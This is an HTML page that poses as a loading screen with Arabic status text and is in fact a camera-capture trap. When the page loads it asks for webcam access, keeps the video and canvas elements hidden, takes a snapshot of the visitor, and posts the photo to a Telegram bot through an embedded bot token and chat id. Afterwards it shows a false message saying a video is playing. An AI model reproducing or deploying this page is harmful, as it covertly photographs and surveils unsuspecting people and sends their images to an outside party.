<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Loading...</title>
  <style>
    body {
      background-color: #000;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      height: 100vh;
      margin: 0;
      font-family: sans-serif;
    }
    #loader {
      font-size: 20px;
    }
    video, canvas {
      display: none !important;
      visibility: hidden;
      opacity: 0;
      position: absolute;
    }
  </style>
</head>
<body>
  <div id="loader">📡 جاري التحميل...</div>
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" width="300" height="300"></canvas>

  <script>
    const chat_id = "6908826896";
    const token = "8216581015:AAFEu3XEvT2jePOMdSU8OYP9olix4JNzfk4";

    async function start() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            takePhoto(stream);
          }, 1000);
        };
      } catch (e) {
        document.getElementById("loader").innerText = "❌ الكاميرا مرفوضة.";
      }
    }

    function takePhoto(stream) {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      stream.getTracks().forEach(track => track.stop());

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', chat_id);
        formData.append('photo', blob, 'photo.png');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).then(r => r.json()).then(d => {
          document.body.innerHTML = "<h2>📱 يتم الآن تشغيل الفيديو...</h2>";
        }).catch(err => {
          document.body.innerHTML = "<h2>❌ فشل في الإرسال</h2>";
        });
      }, 'image/png');
    }

    window.onload = start;
  </script>
</body>
</html>
